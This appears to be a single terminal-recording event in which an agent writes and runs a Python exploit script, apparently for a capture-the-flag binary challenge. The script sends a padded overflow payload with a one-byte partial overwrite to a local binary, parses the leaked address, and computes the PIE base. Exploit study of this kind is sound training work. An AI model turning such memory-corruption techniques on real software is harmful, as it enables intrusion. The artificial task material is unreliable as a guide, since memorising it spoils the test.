[117.474481, "i", "cat << 'EOF' > /app/solve.py\nimport subprocess\nimport struct\n\ndef p64(x):\n    return struct.pack('<Q', x)\ndef u64(x):\n    return struct.unpack('<Q', x.ljust(8, b'\\x00'))[0]\n\np = subprocess.Popen(['/app/gargantuan.bin'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)\n\ntotal_padding = 0x528\npayload1 = b'\\x00' * total_padding + b'\\xd9'\n\nCHUNK_SIZE = 0x200\nfor i in range(5):\n    sz = min(CHUNK_SIZE, len(payload1))\n    if sz > 0:\n        chunk = payload1[:sz].ljust(CHUNK_SIZE, b'\\x00')\n        payload1 = payload1[sz:]\n        p.stdin.write(chunk)\n    else:\n        p.stdin.write(b'\\x00' * CHUNK_SIZE)\n\np.stdin.flush()\n\nout = b''\nwhile b'OO LATE! ' not in out:\n    out += p.stdout.read(1)\n\nleak_str = b''\nwhile True:\n    c = p.stdout.read(1)\n    if c == b'\\n': break\n    leak_str += c\n\nleak = int(leak_str.decode(), 16)\npie_base = leak - 0x11e5\nprint(f\"PIE Base: {hex(pie_base)}\")\nEOF\npython3 /app/solve.py\n"]
